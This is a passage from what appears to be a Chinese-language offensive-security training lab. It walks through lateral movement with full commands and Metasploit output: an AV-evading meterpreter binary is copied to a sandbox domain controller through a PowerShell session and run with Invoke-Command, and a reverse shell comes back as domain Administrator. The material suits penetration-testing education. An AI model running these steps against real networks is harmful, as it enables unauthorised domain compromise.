
## 列表 1004 - 使用 `Invoke-Command` 检查 IP

既然我们知道可以在域控制器上执行命令，我们将传输并执行一个 meterpreter shell。我们可以再次使用带有 AV 绕过功能的 `whoami.exe`。首先，我们必须将 shell 传输到域控制器。为此，我们将使用 PowerShell 命令 `Copy-Item`。为了让 `Copy-Item` 传输到另一个主机，我们必须提供要传输的文件、传输目标以及我们之前创建的 PowerShell 会话。

```powershell
PS C:\Windows\system32> Copy-Item "C:\Users\Public\whoami.exe" -Destination "C:\Users\Public\" -ToSession $dcsesh
```

`Copy-Item "C:\Users\Public\whoami.exe" -Destination "C:\Users\Public\" -ToSession $dcsesh`

## 列表 1005 - 将 whoami 二进制文件传输到域控制器

文件传输完成后，我们需要执行它。但是，必须配置监听器以捕获反向 shell 请求。为此，我们将把当前的 meterpreter shell 放到后台，并启动一个新的监听器。我们通过在运行 `run` 命令时使用 `-j` 标志，将新的 payload 处理器作为后台作业启动。

```
meterpreter > background

[*] Backgrounding session 2....

msf5 exploit(multi/handler) > run -j

[*] Exploit running as background job 1.

[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.11.0.4:80
```

## 列表 1006 - 将新的 payload 处理器作为后台作业启动

既然监听器已在后台运行，我们需要回到 Cevapi 上的会话，以便在域控制器上执行 shell。

```
msf5 exploit(multi/handler) > sessions -l

Active sessions

================

 Id   Type     Information  Connection

 --  ----  ---------  ----------

  1  meterpreter  x86/windows  CEVAPI\jenkinsuser @ CEVAPI  10.11.0.4:80 -> 10.11.1.250

  2  meterpreter  x86/windows  NT AUTHORITY\SYSTEM @ CEVAPI  10.11.0.4:80 -> 10.11.1.250

msf5 exploit(multi/handler) > sessions -i 2

[*] Starting interaction with 2...

meterpreter > shell

Process 5612 created.

Channel 2 created.

C:\Windows\system32>powershell
```

`powershell`

## 攻击性安全

最后，我们将执行 PowerShell 命令以在域控制器上运行 `whoami` 二进制文件，使用以下命令：

```powershell
PS C:\Windows\system32> $cdcesh = New-PSSession -Computer SANDBOXDC

PS C:\Windows\system32> Invoke-Command -Session $cdcesh -ScriptBlock {C:\Users\Public\whoami.exe}

[*] Sending stage (180291 bytes) to 10.11.1.250

[*] Meterpreter session 3 opened (10.11.0.4:80 -> 10.11.1.250:54198) at 17:31:12
```

如果二进制文件执行成功，我们将收到监听器打开新会话的警报。让我们先将在 Cevapi 上的会话放到后台。

```powershell
^C

Terminate channel 2? [y/N] y

meterpreter > background

[*] Backgrounding session 2...
```

一旦我们回到 metasploit 控制台，我们就可以列出所有活动会话，我们应该会在 `SANDBOXDC` 主机上看到一个新的会话被创建。

```bash
msf5 exploit(multi/handler) > sessions -l

Active sessions

===============

Id   Type     Information          Connection

--   ----     ---------------      ----------

1    meterpreter x86/windows      CEVAPI\jenkinsuser @ CEVAPI 10.11.0.4:80 -> 10.11.1.250

2    meterpreter x86/windows      NT AUTHORITY\SYSTEM @ CEVAPI 10.11.0.4:80 -> 10.11.1.250

3    meterpreter x86/windows      sandbox\Administrator @ SANDBOXDC 10.11.0.4:88 -> 10.11.1.250
```

最后，我们可以与该新会话进行交互。

```powershell
msf5 exploit(multi/handler) > sessions -i 3

[*] Starting interaction with 3...

meterpreter > shell

Process 3360 created.

Channel 1 created.

Microsoft Windows [Version 10.0.14393]

(c) 2016 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\Documents>whoami
```
